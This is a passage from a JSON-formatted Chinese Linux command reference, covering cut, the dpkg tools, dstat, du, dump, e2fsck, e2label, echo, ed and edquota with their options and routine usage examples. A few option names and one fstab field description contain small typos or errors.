-d\";\" test2.txt \nName\ntom\njack\nalex\n\n```\n\n### 指定字段的字符或者字节范围  \n\ncut命令可以将一串字符作为列来显示，字符字段的记法：\n\n*    **N-** ：从第N个字节、字符、字段到结尾；\n*    **N-M** ：从第N个字节、字符、字段到第M个（包括M在内）字节、字符、字段；\n*    **-M** ：从第1个字节、字符、字段到第M个（包括M在内）字节、字符、字段。\n\n上面是记法，结合下面选项将摸个范围的字节、字符指定为字段：\n\n*    **-b**  表示字节；\n*    **-c**  表示字符；\n*    **-f**  表示定义字段。\n\n **示例** \n\n```\n[root@localhost text]# cat test.txt \nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\n\n```\n\n打印第1个到第3个字符：\n\n```\n[root@localhost text]# cut -c1-3 test.txt \nabc\nabc\nabc\nabc\nabc\n\n```\n\n打印前2个字符：\n\n```\n[root@localhost text]# cut -c-2 test.txt \nab\nab\nab\nab\nab\n\n```\n\n打印从第5个字符开始到结尾：\n\n```\n[root@localhost text]# cut -c5- test.txt \nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\n```\n\n\n"},{"name":"dpkg","categoryId":0,"data":"dpkg\n\u003d\u003d\u003d\n\nDebian Linux系统上安装、创建和管理软件包\n\n## 补充说明\n\n**dpkg命令** 是Debian Linux系统用来安装、创建和管理软件包的实用工具。\n\n### 语法  \n\n```\ndpkg(选项)(参数)\n```\n\n### 选项  \n\n```\n-i：安装软件包；\n-r：删除软件包；\n-P：删除软件包的同时删除其配置文件；\n-L：显示于软件包关联的文件；\n-l：显示已安装软件包列表；\n--unpack：解开软件包；\n-c：显示软件包内文件列表；\n--confiugre：配置软件包。\n```\n\n### 参数  \n\nDeb软件包：指定要操作的.deb软件包。\n\n### 实例  \n\n```\ndpkg -i package.deb     #安装包\ndpkg -r package         #删除包\ndpkg -P package         #删除包（包括配置文件）\ndpkg -L package         #列出与该包关联的文件\ndpkg -l package         #显示该包的版本\ndpkg --unpack package.deb  #解开deb包的内容\ndpkg -S keyword            #搜索所属的包内容\ndpkg -l                    #列出当前已安装的包\ndpkg -c package.deb        #列出deb包的内容\ndpkg --configure package   #配置包\n```\n\n\n"},{"name":"dpkg-deb","categoryId":0,"data":"dpkg-deb\n\u003d\u003d\u003d\n\nDebian Linux下的软件包管理工具\n\n## 补充说明\n\n**dpkg-deb命令** 是Debian Linux下的软件包管理工具，它可以对软件包执行打包和解包操作以及提供软件包信息。\n\n### 语法  \n\n```\ndpkg-deb(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：显示软件包中的文件列表；\n-e：将主控信息解压；\n-f：把字段内容打印到标准输出；\n-x：将软件包中的文件释放到指定目录下；\n-X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；\n-w：显示软件包的信息；\n-l：显示软件包的详细信息；\n-R：提取控制信息和存档的清单文件；\n-b：创建debian软件包。\n```\n\n### 参数  \n\n文件：指定要操作的“.deb”软件包的全名或软件名。\n\n### 实例  \n\n解压程序文件：\n\n```\ndpkg-deb -x drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom\n```\n\n解压控制文件：\n\n```\ndpkg-deb -e drcom-pum_1.0-0ubuntu1~ppa1~jaunty1_i386.deb drcom/DEBIAN\n```\n\n打包生成deb文件：\n\n```\ndpkg-deb -b drcom drcom_1.4.8.2_i386.deb\n```\n\n查询deb包中的文件内容：\n\n```\ndpkg-deb -c demo.deb\n```\n\n\n"},{"name":"dpkg-divert","categoryId":0,"data":"dpkg-divert\n\u003d\u003d\u003d\n\nDebian Linux中创建并管理一个转向列表\n\n## 补充说明\n\n**dpkg-divert命令** 是Debian Linux中创建并管理一个转向（diversion）列表，其使得安装文件的默认位置失效的工具。\n\n### 语法  \n\n```\ndpkg-divert(选项)(参数)\n```\n\n### 选项  \n\n```\n--add：添加一个转移文件；\n--remove：删除一个转移文件；\n--list：列出匹配的转移；\n--truename：对应转移文件真实文件名；\n--quidet：安静模式。\n```\n\n### 参数  \n\n文件：指定转移文件名。\n\n### 实例  \n\n指定软件包wibble安装时，写入`/usr/bin/example.foo`，而不是`/usr/bin/example`：\n\n```\ndpkg-divert --package wibble --divert /usr/bin/example.foo --rename /usr/bin/example\n```\n\n指定软件包wibble安装时，删除对`/usr/bin/example`的转移修改：\n\n```\ndpkg-divert --package wibble --rename --remove /usr/bin/example\n```\n\n删除对`/usr/bin/example`的转移修改：\n\n```\ndpkg-divert --rename --remove /usr/bin/example\n```\n\n添加一个软件包安装时，写入`/usr/bin/example.foo`，而不是`/usr/bin/example`的修改：\n\n```\ndpkg-divert --divert /usr/bin/example.foo --rename /usr/bin/example\n```\n\n\n"},{"name":"dpkg-preconfigure","categoryId":0,"data":"dpkg-preconfigure\n\u003d\u003d\u003d\n\nDebian Linux中软件包安装之前询问问题\n\n## 补充说明\n\n**dpkg-preconfigure命令** 用于在Debian Linux中软件包安装之前询问问题。\n\n### 语法  \n\n```\ndpkg-preconfigure(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：选择使用的前端；\n-p：感兴趣的最低的优先级问题；\n--apt：在apt模式下运行。\n```\n\n### 参数  \n\n软件包：指定“.deb”软件包。\n\n### 实例  \n\n导入debconf模板：\n\n```\ndpkg-preconfigure /var/cache/apt/archives/mysql-server-5.5*.deb\n```\n\n\n"},{"name":"dpkg-query","categoryId":0,"data":"dpkg-query\n\u003d\u003d\u003d\n\nDebian Linux中软件包的查询工具\n\n## 补充说明\n\n**dpkg-query命令** 是Debian Linux中软件包的查询工具，它从dpkg软件包数据库中查询并辨识软件包的信息。\n\n### 语法  \n\n```\ndpkg-query(选项)(参数)\n```\n\n### 选项  \n\n```\n-l：列出符合匹配模式的软件包；\n-s：查询软件包的状态信息；\n-L：显示软件包所安装的文件列表；\n-S：从安装的软件包中查询文件；\n-w：显示软件包信息；\n-c：显示软件包的控制文件路径；\n-p：显示软件包的细节。\n```\n\n### 参数  \n\n软件包名称：指定需要查询的软件包。\n\n### 实例  \n\n查找文件file1在哪个包里安装：\n\n```\ndpkg-query -S file1\n```\n\n列出ubuntu下所安装软件列表：\n\n```\ndpkg-query -W --showformat\u003d\u0027${Package} ${Version}\\n\u0027 \u003e filename\n```\n\n查看软件包详细信息：\n\n```\ndpkg-query -s capistrano\n```\n\n查看软件包安装时安装到系统的文件列表：\n\n```\ndpkg-query -L capistrano\n```\n\n列出所有安装的包：\n\n```\ndpkg-query -l\n```\n\n查看软件包的确切状态（是否安装）以及版本号：\n\n```\ndpkg-query -W -f\u003d\u0027${Status} ${Version}\\n\u0027 apache-perl\n```\n\n\n"},{"name":"dpkg-reconfigure","categoryId":0,"data":"dpkg-reconfigure\n\u003d\u003d\u003d\n\nDebian Linux中重新配制一个已经安装的软件包\n\n## 补充说明\n\n**dpkg-reconfigure命令** 是Debian Linux中重新配置已经安装过的软件包，可以将一个或者多个已安装的软件包传递给此指令，它将询问软件初次安装后的配置问题。\n\n当用户需要再次对软件包配置的时候，可以使用dpkg-reconfigure命令来对指定的软件包进行配置。\n\n### 语法  \n\n```\ndpkg-reconfigure(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：重新配置所有的软件包；\n-u或--unseen-only：仅显示未提过的问题；\n--default-priority：使用默认优先级，而非“低”级；\n--force：强制执行操作，需谨慎使用此选项；\n--no-reload：不要轻易的重装模板（使用时请慎重考虑）；\n-f或--frontend：指定 debconf 前端界面；\n-p或--priority：指定要显示的问题的最优先级；\n--terse：开启简要模式。\n\n```\n\n### 参数  \n\n软件包名：需要重新配置的已安装的软件包。\n\n### 实例  \n\n用于配置语言：\n\n```\nsudo dpkg-reconfigure locales\n```\n\n\n"},{"name":"dpkg-split","categoryId":0,"data":"dpkg-split\n\u003d\u003d\u003d\n\nDebian Linux中将大软件包分割成小包\n\n## 补充说明\n\n**dpkg-split命令** 用来将Debian Linux中的大软件包分割成小软件包，它还能够将已分割的文件进行合并。\n\n### 语法  \n\n```\ndpkg-split(选项)(参数)\n```\n\n### 选项  \n\n```\n-S：设置分割后的每个小文件最大尺寸（以字节为单位）；\n-s：分割软件包；\n-j\u003c分块文件\u003e\u003c分块文件\u003e：把各个分块合并到一起；\n-I\u003c分块文件\u003e：显示分块文件的相关信息；\n-l：列出不匹配的部分；\n-dscard\u003c文件名\u003e：忽略不匹配的部分。\n```\n\n### 参数  \n\n软件包：指定需要分割的“.deb”软件包。\n\n### 实例  \n\n把foo.deb分割出N个大小为460KB的文件：\n\n```\ndpkg-split -s foo.deb\n```\n\n合并分割文件：\n\n```\ndpkg-split -j \"foo*\"\n```\n\n\n"},{"name":"dpkg-statoverride","categoryId":0,"data":"dpkg-statoverride\n\u003d\u003d\u003d\n\nDebian Linux中覆盖文件的所有权和模式\n\n## 补充说明\n\n**dpkg-statoverride命令** 用于Debian Linux中覆盖文件的所有权和模式，让dpkg于包安装时使得文件所有权与模式失效。\n\n### 语法  \n\n```\ndpkg-statoverride(选项)\n```\n\n### 选项  \n\n```\n-add：为文件添加一个改写；\n--remove：为文件删除一个改写；\n--list：显示所有改写列表；\n--update：如果文件存在，则立刻执行改写操作。\n```\n\n### 实例  \n\n修改文件夹的权限属性：\n\n```\nsudo dpkg-statoverride --update --add nagios nagios 751 /var/lib/nagios3\n```\n\n强制修改文件夹的权限属性：\n\n```\nsudo dpkg-statoverride --force --update --add root sasl 755 /var/spool/postfix/var/run/saslauthd\n```\n\n将文件从数据库中删除：\n\n```\nsudo dpkg-statoverride --remove /usr/bin/wall\n```\n\n\n"},{"name":"dpkg-trigger","categoryId":0,"data":"dpkg-trigger\n\u003d\u003d\u003d\n\nDebian Linux下的软件包触发器\n\n## 补充说明\n\n**dpkg-trigger命令** 是Debian Linux下的软件包触发器。\n\n### 语法  \n\n```\ndpkg-trigger(选项)(参数)\n```\n\n### 选项  \n\n```\n--check-supported：检查运行的dpkg是否支持触发器，返回值为0，则支持触发器。\n--help：显示帮助信息；\n--admindir\u003d\u003c目录\u003e：设置dpkg数据库所在的目录；\n--no-act：仅用于测试，不执行任何操作；\n--by-package\u003d\u003c软件包\u003e：覆盖触发器等待者。\n```\n\n### 参数  \n\n触发器名：指定触发器名称。\n\n\n"},{"name":"dris","categoryId":0,"data":"dris\n\u003d\u003d\u003d\n\n显示和清空目录堆栈中的内容\n\n## 补充说明\n\n**dris命令** 用于显示和清空目录堆栈中的内容。\n\n### 语法  \n\n```\ndris(选项)\n```\n\n### 选项  \n\n```\n+n：显示从左边算起第n笔的目录；\n-n：显示从右边算起第n笔的目录；\n-l：显示目录完整的记录。\n```\n\n\n"},{"name":"dstat","categoryId":0,"data":"dstat\n\u003d\u003d\u003d\n\n通用的系统资源统计工具\n\n## 补充说明\n\n**dstat命令** 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具，是一个全能系统信息统计工具。与sysstat相比，dstat拥有一个彩色的界面，在手动观察性能状况时，数据比较显眼容易观察；而且dstat支持即时刷新，譬如输入`dstat 3`即每三秒收集一次，但最新的数据都会每秒刷新显示。和sysstat相同的是，dstat也可以收集指定的性能资源，譬如`dstat -c`即显示CPU的使用情况。\n\n### 下载安装  \n\n **方法一** \n\n```\nyum install -y dstat\n```\n\n **方法二** \n\n官网下载地址：http://dag.wieers.com/rpm/packages/dstat\n\n```\nwget http://dag.wieers.com/rpm/packages/dstat/dstat-0.6.7-1.rh7.rf.noarch.rpm\nrpm -ivh dstat-0.6.7-1.rh7.rf.noarch.rpm\n```\n\n### 使用说明  \n\n安装完后就可以使用了，dstat非常强大，可以实时的监控cpu、磁盘、网络、IO、内存等使用情况。\n\n直接使用dstat，默认使用的是`-cdngy`参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。可以在最后指定显示一条信息的时间间隔，如`dstat 5`是没5s显示一条，`dstat 5 10`表示没5s显示一条，一共显示10条。\n\n```\n[root@iZ23uulau1tZ ~]# dstat\n----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw\n  0   0  99   0   0   0|7706B  164k|   0     0 |   0     0 | 189   225\n  0   0 100   0   0   0|   0     0 |4436B  826B|   0     0 | 195   248\n  1   0  99   0   0   0|   0     0 |4744B  346B|   0     0 | 203   242\n  0   0 100   0   0   0|   0     0 |5080B  346B|   0     0 | 206   242\n  0   1  99   0   0   0|   0     0 |5458B  444B|   0     0 | 214   244\n  1   0  99   0   0   0|   0     0 |5080B  346B|   0     0 | 208   242\n```\n\n下面对显示出来的部分信息作一些说明：\n\n1.  cpu：hiq、siq分别为硬中断和软中断次数。\n2.  system：int、csw分别为系统的中断次数（interrupt）和上下文切换（context switch）。\n\n其他的都很好理解。\n\n### 语法  \n\n```\ndstat [-afv] [options..] [delay [count]]\n```\n\n### 常用选项  \n\n```\n-c：显示CPU系统占用，用户占用，空闲，等待，中断，软件中断等信息。\n-C：当有多个CPU时候，此参数可按需分别显示cpu状态，例：-C 0,1 是显示cpu0和cpu1的信息。\n-d：显示磁盘读写数据大小。\n-D hda,total：include hda and total。\n-n：显示网络状态。\n-N eth1,total：有多块网卡时，指定要显示的网卡。\n-l：显示系统负载情况。\n-m：显示内存使用情况。\n-g：显示页面使用情况。\n-p：显示进程状态。\n-s：显示交换分区使用情况。\n-S：类似D/N。\n-r：I/O请求情况。\n-y：系统状态。\n--ipc：显示ipc消息队列，信号等信息。\n--socket：用来显示tcp udp端口状态。\n-a：此为默认选项，等同于-cdngy。\n-v：等同于 -pmgdsc -D total。\n--output 文件：此选项也比较有用，可以把状态信息以csv的格式重定向到指定的文件中，以便日后查看。例：dstat --output /root/dstat.csv \u0026 此时让程序默默的在后台运行并把结果输出到/root/dstat.csv文件中。\n```\n\n当然dstat还有很多更高级的用法，常用的基本这些选项，更高级的用法可以结合man文档。\n\n### 实例  \n\n如想监控swap，process，sockets，filesystem并显示监控的时间：\n\n```\n[root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:23:48|   0     0 |  0   0 0.0|104   8   5   0   0|  704   6488\n26-07 09:23:49|   0     0 |  0   0   0|104   8   5   0   0|  704   6488\n26-07 09:23:50|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:51|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:52|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:53|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n```\n\n若要将结果输出到文件可以加`--output filename`：\n\n```\n[root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs --output /tmp/ds.csv\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:25:31|   0     0 |  0   0 0.0|104   8   5   0   0|  736   6493\n26-07 09:25:32|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:33|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:34|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:35|   0     0 |  0   0   0|104   8   5   0   0|  736   6494\n26-07 09:25:36|   0     0 |  0   0   0|104   8   5   0   0|  736   6494\n```\n\n这样生成的csv文件可以用excel打开，然后生成图表。\n\n通过`dstat --list`可以查看dstat能使用的所有参数，其中上面internal是dstat本身自带的一些监控参数，下面`/usr/share/dstat`中是dstat的插件，这些插件可以扩展dstat的功能，如可以监控电源（battery）、mysql等。\n\n下面这些插件并不是都可以直接使用的，有的还依赖其他包，如想监控mysql，必须要装python连接mysql的一些包。\n\n```\n[root@iZ23uulau1tZ ~]# dstat --list\ninternal:\n        aio, cpu, cpu24, disk, disk24, disk24old, epoch, fs, int, int24, io, ipc, load, lock, mem, net, page, page24, proc, raw, socket, swap, swapold, sys, tcp, time, udp, unix, vm\n/usr/share/dstat:\n        battery, battery-remain, cpufreq, dbus, disk-util, fan, freespace, gpfs, gpfs-ops, helloworld, innodb-buffer, innodb-io, innodb-ops, lustre, memcache-hits, mysql-io, mysql-keys, mysql5-cmds, mysql5-conn, mysql5-io, mysql5-keys,\n        net-packets, nfs3, nfs3-ops, nfsd3, nfsd3-ops, ntp, postfix, power, proc-count, rpc, rpcd, sendmail, snooze, thermal, top-bio, top-cpu, top-cputime, top-cputime-avg, top-io, top-latency, top-latency-avg, top-mem, top-oom, utmp,\n        vm-memctl, vmk-hba, vmk-int, vmk-nic, vz-cpu, vz-io, vz-ubc, wifi\n```\n\ndstat命令的基本用法就说到这里，更多用法有待摸索，如果您需要补充内容请给我们发邮件，谢谢！\n\n\n"},{"name":"du","categoryId":8,"data":"du\n\u003d\u003d\u003d\n\n显示每个文件和目录的磁盘使用空间\n\n## 补充说明\n\n**du命令** 也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。\n\n### 语法  \n\n```\ndu [选项][文件]\n```\n\n### 选项  \n\n```\n-a或-all 显示目录中个别文件的大小。\n-b或-bytes 显示目录或文件大小时，以byte为单位。\n-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。\n-k或--kilobytes 以KB(1024bytes)为单位输出。\n-m或--megabytes 以MB为单位输出。\n-s或--summarize 仅显示总计，只列出最后加总的值。\n-h或--human-readable 以K，M，G为单位，提高信息的可读性。\n-x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。\n-L\u003c符号链接\u003e或--dereference\u003c符号链接\u003e 显示选项中所指定符号链接的源文件大小。\n-S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。\n-X\u003c文件\u003e或--exclude-from\u003d\u003c文件\u003e 在\u003c文件\u003e指定目录或文件。\n--exclude\u003d\u003c目录或文件\u003e 略过指定的目录或文件。\n-D或--dereference-args 显示指定符号链接的源文件大小。\n-H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。\n-l或--count-links 重复计算硬件链接的文件。\n```\n\n### 实例  \n\n显示目录或者文件所占空间：\n\n```\nroot@localhost [test]# du\n608 ./test6\n308 ./test4\n4 ./scf/lib\n4 ./scf/service/deploy/product\n4 ./scf/service/deploy/info\n12 ./scf/service/deploy\n16 ./scf/service\n4 ./scf/doc\n4 ./scf/bin\n32 ./scf\n8 ./test3\n1288 .\n```\n\n只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的1288为当前目录的总大小\n\n显示指定文件所占空间：\n\n```\n[root@localhost test]# du log2012.log\n300 log2012.log\n```\n\n查看指定目录的所占空间：\n\n```\n[root@localhost test]# du scf\n4 scf/lib\n4 scf/service/deploy/product\n4 scf/service/deploy/info\n12 scf/service/deploy\n16 scf/service\n4 scf/doc\n4 scf/bin\n32 scf\n```\n\n显示多个文件所占空间：\n\n```\n[root@localhost test]# du log30.tar.gz log31.tar.gz\n4 log30.tar.gz\n4 log31.tar.gz\n```\n\n只显示总和的大小:\n\n```\n[root@localhost test]# du -s\n1288 .\n\n[root@localhost test]# du -s scf\n32 scf\n\n[root@localhost test]# cd ..\n[root@localhost soft]# du -s test\n1288 test\n```\n\n\n"},{"name":"dump","categoryId":10,"data":"dump\n\u003d\u003d\u003d\n\n用于备份ext2或者ext3文件系统\n\n## 补充说明\n\n**dump命令** 用于备份ext2或者ext3文件系统。可将目录或整个文件系统备份至指定的设备，或备份成一个大文件。\n\n### 语法  \n\n```\ndump(选项)(参数)\n```\n\n### 选项  \n\n```\n-0123456789：备份的层级；\n-b\u003c区块大小\u003e：指定区块的大小，单位为KB；\n-B\u003c区块数目\u003e：指定备份卷册的区块数目；\n-c：修改备份磁带预设的密度与容量；\n-d\u003c密度\u003e：设置磁带的密度。单位为BPI；\n-f\u003c设备名称\u003e：指定备份设备；\n-h\u003c层级\u003e：当备份层级等于或大于指定的层级时，将不备份用户标示为“nodump”的文件；\n-n：当备份工作需要管理员介入时，向所有“operator”群组中的使用者发出通知；\n-s\u003c磁带长度\u003e：备份磁带的长度，单位为英尺；\n-T\u003c日期\u003e：指定备份的时间与日期；\n-u：备份完毕后，在/etc/dumpdates中记录备份的文件系统、层级、日期与时间等；\n-w：与-W类似，但仅显示需要备份的文件；\n-W：显示需要备份的文件及其最后一次备份的层级、时间与日期。\n```\n\n### 参数  \n\n备份源：指定要备份的文件、目录或者文件系统。\n\n### 实例  \n\n将`/home`目录所有内容备份到`/tmp/homeback.bak`文件中，备份层级为`0`并在`/etc/dumpdates`中记录相关信息：\n\n```\n‍dump -0u -f /tmp/homeback.bak /home\n```\n\n将`/home`目录所有内容备份到`/tmp/homeback.bak`文件中，备份层级为`1`（只备份上次使用层次`0`备份后发生过改变的数据）并在`/etc/dumpdates`中记录相关信息：\n\n```\ndump -1u -f /tmp/homeback.bak /home\n```\n\n通过dump命令的备份层级，可实现完整+增量备份、完整+差异备份，在配合crontab可以实现无人值守备份。\n\n\n"},{"name":"e2fsck","categoryId":3,"data":"e2fsck\n\u003d\u003d\u003d\n\n用于检查第二扩展文件系统的完整性\n\n## 补充说明\n\n**e2fsck命令** 用于检查第二扩展文件系统的完整性，通过适当的选项可以尝试修复出现的错误。\n\ne2fsck执行后的传回值及代表意义如下：\n\n*   0 没有任何错误发生。\n*   1 文件系统发生错误，并且已经修正。\n*   2 文件系统发生错误，并且已经修正。\n*   4 文件系统发生错误，但没有修正。\n*   8 运作时发生错误。\n*   16 使用的语法发生错误。\n*   128 共享的函数库发生错误。\n\n### 语法  \n\n```\ne2fsck(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：不询问使用者意见，便自动修复文件系统；\n-b\u003csuperblock\u003e：指定superblock，而不使用预设的superblock；\n-B\u003c区块大小\u003e：指定区块的大小，单位为字节；\n-c：一并执行badblocks，以标示损坏的区块；\n-C：将检查过程的信息完整记录在file descriptor中，使得整个检查过程都能完整监控；\n-d：显示排错信息；\n-f：即使文件系统没有错误迹象，仍强制地检查正确性；\n-F：执行前先清除设备的缓冲区；\n-l\u003c文件\u003e：将文件中指定的区块加到损坏区块列表；\n-L\u003c文件\u003e：先清除损坏区块列表，再将文件中指定的区块加到损坏区块列表。因此损坏区块列表的区块跟文件中指定的区块是一样的；\n-n：以只读模式开启文件系统，并采取非互动方式执行，所有的问题对话均设置以\"no\"回答；\n-p：不询问使用者意见，便自动修复文件系统；\n-r：此参数只为了兼容性而存在，并无实际作用；\n-s：如果文件系统的字节顺序不适当，就交换字节顺序，否则不做任何动作；\n-S：不管文件系统的字节顺序，一律交换字节顺序；\n-t：显示时间信息；\n-v：执行时显示详细的信息；\n-V：显示版本信息；\n-y：采取非互动方式执行，所有的问题均设置以\"yes\"回答。\n```\n\n### 参数  \n\n文件系统或者分区：指定文件系统或者分区所对应的设备文件名。\n\n### 实例  \n\n检查`/dev/sda1`是否有问题，如发现问题便自动修复：\n\n```\ne2fsck -a -y /dev/sda1\n```\n\n执行e2fsck或fsck前请先umount partition，否则有机会令档案系统毁损。如果需要对根目录`/`进行检查及修复，便需要进入singal user mode执行。\n\n\n"},{"name":"e2label","categoryId":0,"data":"e2label\n\u003d\u003d\u003d\n\n设置第二扩展文件系统的卷标\n\n## 补充说明\n\n**e2label命令** 用来设置第二扩展文件系统的卷标。\n\n### 语法  \n\n```\ne2label(参数)\n```\n\n### 参数  \n\n*   文件系统：指定文件系统所对应的设备文件名；\n*   新卷标：为文件系统指定新卷标。\n\n### 实例  \n\n许多用了多年Linux的人可能也没有用过e2label命令。但是这个命令相当有效。在介绍它之前,我们先看看`/etc/fstab文`件：\n\n```\nlabel\u003d//ext3 defaults 1 1\n/dev/hda7 /usr ext3 defaults 1 1\n```\n\n第二行的意思很容易懂，就是把`/dev/hda7` mount到`/usr`上。第一行没有指明分区，意思是把label(卷标)为/ 的分区mount到/上。这样写的好处在于即使如果把硬盘从主板上的ide0(hda) 换到ide2(hdc)上，系统仍然可以自动挂载正确的分区。通常Linux安装的时候已经自动指定了卷标。如果是手动增加的新分区，可以用下边的命令为 其指定卷标：\n\n```\ne2label /dev/hdax /new\nmkdir /new\n```\n\n然后在`/etc/fstab`里加入：\n\n```\nlabel\u003d/new  /new  ext3  defaults  1 1\n```\n\n下次重新起动机器的时候，就会把卷标为`/new`的分区挂接到`/new`上。\n\n\n"},{"name":"echo","categoryId":0,"data":"echo\n\u003d\u003d\u003d\n\n输出指定的字符串或者变量\n\n## 补充说明\n\n**echo命令** 用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。\n\n### 语法  \n\n```\necho(选项)(参数)\n```\n\n### 选项  \n\n```\n-e：激活转义字符。\n```\n\n使用`-e`选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：\n\n*   \\a 发出警告声；\n*   \\b 删除前一个字符；\n*   \\c 最后不加上换行符号；\n*   \\f 换行但光标仍旧停留在原来的位置；\n*   \\n 换行且光标移至行首；\n*   \\r 光标移至行首，但不换行；\n*   \\t 插入tab；\n*   \\v 与\\f相同；\n*   \\\\ 插入\\字符；\n*   \\nnn 插入nnn（八进制）所代表的ASCII字符；\n\n### 参数  \n\n变量：指定要打印的变量。\n\n### 实例  \n\n用echo命令打印带有色彩的文字：\n\n **文字色：** \n\n```\necho -e \"\\e[1;31mThis is red text\\e[0m\"\nThis is red text\n```\n\n*   `\\e[1;31m` 将颜色设置为红色\n*   `\\e[0m` 将颜色重新置回\n\n颜色码：重置\u003d0，黑色\u003d30，红色\u003d31，绿色\u003d32，黄色\u003d33，蓝色\u003d34，洋红\u003d35，青色\u003d36，白色\u003d37\n\n **背景色** ：\n\n```\necho -e \"\\e[1;42mGreed Background\\e[0m\"\nGreed Background\n```\n\n颜色码：重置\u003d0，黑色\u003d40，红色\u003d41，绿色\u003d42，黄色\u003d43，蓝色\u003d44，洋红\u003d45，青色\u003d46，白色\u003d47\n\n **文字闪动：** \n\n```\necho -e \"\\033[37;31;5mMySQL Server Stop...\\033[39;49;0m\"\n\n```\n\n红色数字处还有其他数字参数：0 关闭所有属性、1 设置高亮度（加粗）、4 下划线、5 闪烁、7 反显、8 消隐\n\n\n"},{"name":"ed","categoryId":1,"data":"ed\n\u003d\u003d\u003d\n\n单行纯文本编辑器\n\n## 补充说明\n\n**ed命令** 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。ed命令支持多个内置命令，常见内置命令如下：\n\n```\nA：切换到输入模式，在文件的最后一行之后输入新的内容；\nC：切换到输入模式，用输入的内容替换掉最后一行的内容；\ni：切换到输入模式，在当前行之前加入一个新的空行来输入内容；\nd：用于删除最后一行文本内容；\nn：用于显示最后一行的行号和内容；\nw：\u003c文件名\u003e：一给定的文件名保存当前正在编辑的文件；\nq：退出ed编辑器。\n```\n\n### 语法  \n\n```\ned(选项)(参数)\n```\n\n### 选项  \n\n```\n-G或——traditional：提供兼容的功能；\n-p\u003c字符串\u003e：指定ed在command mode的提示字符；\n-s，-，--quiet或——silent：不执行开启文件时的检查功能；\n--help：显示帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n文件：待编辑的文件。\n\n\n"},{"name":"edquota","categoryId":8,"data":"edquota\n\u003d\u003d\u003d\n\n用于编辑指定用户或工作组磁盘配额\n\n## 补充说明\n\n**edquota命令** 用于编辑指定用户或工作组磁盘配额。edquota预设会使用vi来编辑使用者或群组的quota设置。\n\n### 语法  \n\n```\nedquota(选项)(参数)\n```\n\n### 选项  \n\n```\n-u：设置用户的quota，这是预设的参数；\n-g：设置群组的quota；\n-p\u003c源用户名称\u003e：将源用户的quota设置套用至其他用户或群组；\n-t：设置宽限期限。\n```\n\n### 参数  \n\n用户：指定要编辑磁盘配额限制的用户名或者工作组。\n\n### 实例  \n\n **配置系统的磁盘配额支持** \n\n首先，磁盘配额是区域性的，我们可以决定哪块分区进行磁盘配额，哪块分区不用（自然也就不用配置了）。一般而言，作为一台web虚拟主机服务器，`/home`和`/www`（或者类似的）是供用户存放资源的分区，所以可以对这两个分区进行磁盘配额。假定我们需要对`/home`分区实现用户级的限制，而对`/www`进行每个组的用户配额。\n\n第一步：\n\n```\nvi /etc/fstab\n```\n\n找到对应于`/home`和`/www`的行，例如：\n\n```\n/dev/sda5 /home ext2 defaults 1 2\n/dev/sda7 /www ext2 defaults 1 2\n```\n\n在`/home`里实现用户级的磁盘配额，所以对sda5行的挂装选项域做如下修改：\n\n```\n/dev/sda5 /home ext2 defaults，usrquota 1 2\n```\n\n注意，是usrquota哦。类似的，我们可以如下修改`/www`行：\n\n```\n/dev/sda7 /www ext2 defaults，grpquota 1 2\n```\n\n如编辑根用户\n\n改`/etc/fstab`文件中\n\n```\nLABEL\u003d/ / ext2 defaults,usrquota,grpquota 1 1\n```\n\n说明：`/etc/fstab`文件的每一行由六个字段组成：\n\n*   第一个字段：文件系统（分区）的注释（类似卷标）；\n*   第二个字段：文件系统的装载点；\n*   第三个字段：文件系统类型（磁盘配额只能在ext2文件系统上实现）；\n*   第四个字段：装载文件系统是使用的选项，如果只想实现基于用户的磁盘配额，就加入usrquota关键字，只想实现基于组的磁盘配额，就加入grpqouta关键字，如果两者都需要，就全写入，中间可以用逗号分隔。\n*   第五个字段：表明该文件系统（分区）是否为只读，如果是0就表示只读，1表示可以读写。\n*   